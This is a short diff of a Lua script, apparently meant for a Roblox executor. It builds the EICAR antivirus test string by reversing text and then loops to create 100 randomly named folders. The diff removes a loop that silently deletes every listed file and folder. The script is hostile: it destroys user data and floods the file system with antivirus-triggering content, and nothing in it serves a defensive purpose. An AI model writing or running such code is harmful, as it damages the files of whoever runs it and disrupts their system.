@@ -1,8 +1,4 @@
 local FUNNY_STRING = string.reverse("*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\4[PA@%P!O5X")
-                                    for i, v in next, listfiles("") do 
-					pcall(delfile, v)
-					pcall(delfolder, v)
-				    end
 				    for i = 1, 100 do
 					local s = randomString()
 					makefolder(s)
